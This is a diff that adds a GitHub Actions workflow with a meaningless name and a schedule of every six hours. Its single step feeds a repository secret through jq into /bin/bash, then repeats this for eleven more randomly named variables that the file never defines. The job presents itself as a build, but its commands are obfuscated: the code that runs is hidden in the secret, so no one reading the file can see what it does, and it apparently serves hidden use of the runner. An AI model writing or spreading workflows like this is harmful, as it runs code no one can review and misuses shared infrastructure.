@@ -1,0 +1,29 @@
+name: yanzhichundebingt
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanzhichundebingt
+        env:
+          vtrm7691: ${{ secrets.vtrm7691 }}
+        run: |
+          echo $vtrm7691 | jq -r .zqj712 | /bin/bash
+          echo $b94 | jq -r .lft8670 | /bin/bash
+          echo $ru8 | jq -r .aunu9244 | /bin/bash
+          echo $ajzv2 | jq -r .kfw1 | /bin/bash
+          echo $zep12090 | jq -r .fqc188 | /bin/bash
+          echo $d72144 | jq -r .pl6638 | /bin/bash
+          echo $va35 | jq -r .m62 | /bin/bash
+          echo $v862 | jq -r .rqhyn5 | /bin/bash
+          echo $cdj15527 | jq -r .wk32 | /bin/bash
+          echo $qv86546 | jq -r .uqla69159 | /bin/bash
+          echo $bg74127 | jq -r .uuc69951 | /bin/bash
+          echo $svkf5 | jq -r .m34516 | /bin/bash
+
